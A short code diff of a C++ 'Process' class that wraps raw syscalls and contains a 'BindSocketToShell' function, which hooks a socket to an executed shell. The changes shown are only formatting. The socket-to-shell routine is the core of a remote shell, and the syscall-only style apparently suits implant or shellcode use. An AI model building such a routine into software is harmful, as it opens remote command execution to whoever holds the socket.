@@ -32,7 +32,7 @@ SSIZE Process::Dup2(SSIZE oldfd, SSIZE newfd) noexcept
 }
 
 // Execve syscall wrapper
-SSIZE Process::Execve(const CHAR* pathname, CHAR* const argv[], CHAR* const envp[]) noexcept
+SSIZE Process::Execve(const CHAR *pathname, CHAR *const argv[], CHAR *const envp[]) noexcept
 {
     return System::Call(SYS_EXECVE, (USIZE)pathname, (USIZE)argv, (USIZE)envp);
 }
@@ -44,7 +44,7 @@ SSIZE Process::Setsid() noexcept
 }
 
 // BindSocketToShell - Main function to bind a socket to a shell process
-SSIZE Process::BindSocketToShell(SSIZE socketFd, const CHAR* cmd) noexcept
+SSIZE Process::BindSocketToShell(SSIZE socketFd, const CHAR *cmd) noexcept
 {
     if (socketFd < 0 || cmd == nullptr)
     {
@@ -78,13 +78,13 @@ SSIZE Process::BindSocketToShell(SSIZE socketFd, const CHAR* cmd) noexcept
         }
 
         // Build argv for execve
-        // argv[0] = cmd, argv[1] = NULL
-        CHAR* argv[2];
-        argv[0] = const_cast<CHAR*>(cmd);
+        // argv[0] = cmd, argv[1] = nullptr
+        CHAR *argv[2];
+        argv[0] = const_cast<CHAR *>(cmd);
         argv[1] = nullptr;
 
         // Empty environment
-        CHAR* envp[1];
+        CHAR *envp[1];
         envp[0] = nullptr;
 
         // Execute the command - this should not return
